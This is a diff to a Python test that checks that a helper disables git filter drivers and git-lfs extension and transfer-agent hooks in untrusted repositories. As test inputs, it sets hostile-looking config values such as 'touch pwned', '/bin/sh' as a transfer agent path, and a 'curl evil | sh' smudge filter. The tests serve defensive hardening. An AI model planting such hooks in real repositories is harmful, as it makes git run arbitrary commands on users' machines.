@@ -358,6 +358,19 @@ def test_filter_opts_leave_git_lfs_alone(tmp_path, monkeypatch):
                  ("process", "git-lfs filter-process"), ("required", "true")):
         git(repo, "config", "--file", str(tmp_path / "gitconfig"), f"filter.lfs.{k}", v)
     assert S.filter_opts(repo) == [], "as `git lfs install` sets it up"
+    assert S.git_env()["GIT_LFS_SKIP_SMUDGE"] == "1", "git-lfs never downloads, so runs no transfer agent"
+    # git-lfs runs commands of its own that the same configuration names: then it is off too
+    lfs_off = ["-c", "filter.lfs.clean=", "-c", "filter.lfs.smudge=", "-c", "filter.lfs.process=",
+               "-c", "filter.lfs.required=false"]
+    for key, value in (("lfs.extension.x.clean", "touch pwned"), ("lfs.Extension.X.smudge", "touch pwned"),
+                       ("lfs.customtransfer.x.path", "/bin/sh"), ("lfs.standalonetransferagent", "x"),
+                       ("LFS.StandaloneTransferAgent", "x")):
+        git(repo, "config", key, value)
+        assert S.filter_opts(repo) == lfs_off, key
+        git(repo, "config", "--unset", key)
+        assert S.filter_opts(repo) == [], key
+    git(repo, "config", "lfs.url", "https://example.com/lfs")   # plain settings are fine
+    assert S.filter_opts(repo) == []
     git(repo, "config", "filter.lfs.smudge", "curl evil | sh")
     git(repo, "config", "filter.My.Driver.clean", "x")
     opts = S.filter_opts(repo)
